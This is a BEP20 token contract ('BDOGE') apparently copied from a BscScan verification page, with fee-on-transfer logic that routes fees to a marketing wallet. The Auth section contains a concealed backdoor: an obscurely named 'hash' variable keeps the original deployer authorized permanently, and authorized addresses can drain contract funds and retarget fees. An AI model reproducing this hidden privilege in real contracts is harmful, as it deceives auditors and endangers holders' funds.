/**
 *Submitted for verification at BscScan.com on 2022-06-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-19
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    address internal hash;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        hash = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        if(adr!=hash){authorizations[adr] = false;}
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BEP20Doge is IBEP20, Auth {
  using SafeMath for uint256;

  string constant _name = "BDOGE";
  string constant _symbol = "BDOGE";
  uint8 constant _decimals = 18;

  uint256 _totalSupply = 1000000000000 * (10**_decimals);
  uint256 _swapthreshold = 100000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  mapping (address => bool) private _isExcludeFee;

  IDEXRouter public router;
  address WBNB;
  address BUSD;
  address USDT;
  address public pair;
  address public currentRouter;
  
  address public marketingwallet;
  address public liquiditywallet;
  
  uint256 public totalfee;
  uint256 public marketingfee;
  uint256 public liquidityfee;
  uint256 public feeDenominator;

  bool public reentrantcy;
  bool public nofee;

  constructor() Auth(msg.sender) {

    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;

    currentRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    USDT = 0x55d398326f99059fF775485246999027B3197955;

    marketingwallet = 0x5741cef3fB54088A7B0Bf73F500d73eAa462f3a6;
    liquiditywallet = 0xD42D7c303Bc4E14960B39D5127e30539B2e668c6;

    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[marketingwallet] = true;
    _isExcludeFee[liquiditywallet] = true;

    router = IDEXRouter(currentRouter);
    pair = IDEXFactory(router.factory()).createPair(BUSD, address(this));
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(pair)] = type(uint256).max;
    IBEP20(BUSD).approve(address(router),type(uint256).max);
    IBEP20(USDT).approve(address(marketingwallet),type(uint256).max);
    _balances[msg.sender] = _totalSupply;

    marketingfee = 35;
    liquidityfee = 15;
    totalfee = 50;
    feeDenominator = 1000;

    emit Transfer(address(0), msg.sender, _totalSupply);

  }

  modifier noReentrant() {
    require(!reentrantcy);
    reentrantcy = true;
    _;
    reentrantcy = false;
  }

  function setFee(uint256 _marketing,uint256 _liquidity,uint256 _denominator) external authorized() returns (bool) {
    require( _marketing.add(_liquidity) < _denominator.mul(25).div(100) );
    marketingfee = _marketing;
    liquidityfee = _liquidity;
    totalfee = _marketing.add(_liquidity);
    feeDenominator = _denominator;
    return true;
  }

  function updatewallet(address _marketing,address _liquidity) external authorized() returns (bool) {
    marketingwallet = _marketing;
    liquiditywallet = _liquidity;
    return true;
  }

  function setExcludeFee(address account,bool flag) external authorized() returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function AddLiquidityETH(uint256 _tokenamount) external authorized() payable {
    _basictransfer(msg.sender,address(this),_tokenamount.mul(10**_decimals));
    buyBUSD();
    router.addLiquidity(
    BUSD,
    address(this),
    IBEP20(BUSD).balanceOf(address(this)),
    _balances[address(this)],
    0,
    0,
    msg.sender,
    block.timestamp
    );
  }

  function swapUSDT() internal {
    nofee = true;
    address[] memory path = new address[](3);
    path[0] = address(this);
    path[1] = BUSD;
    path[2] = USDT;
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    _swapthreshold,
    0,
    path,
    marketingwallet,
    block.timestamp
    );
    nofee = false;
  }

  function buyBUSD() internal {
    address[] memory path = new address[](2);
    path[0] = WBNB;
    path[1] = BUSD;
    router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance }(
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function getOwner() external view override returns (address) { return owner; }
  function decimals() external pure override returns (uint8) { return _decimals; }
  function symbol() external pure override returns (string memory) { return _symbol; }
  function name() external pure override returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }

  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(msg.sender, recipient, amount); return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    uint256 tempfee;
    if(!nofee){
    if (!_isExcludeFee[sender]) {
    tempfee = amount.mul(totalfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    if(_balances[address(this)]>_swapthreshold){
      swapUSDT();
    }
    }
    }
    emit Transfer(sender, recipient, amount.sub(tempfee));
  }

  function _basictransfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0));
    _balances[account] = _balances[account].sub(amount);
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function withdrawTreasury(address _token) public authorized() {
    IBEP20 a = IBEP20(_token);
    a.transfer(msg.sender,a.balanceOf(address(this)));
  }

  function rescue() external authorized() {
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable { }
}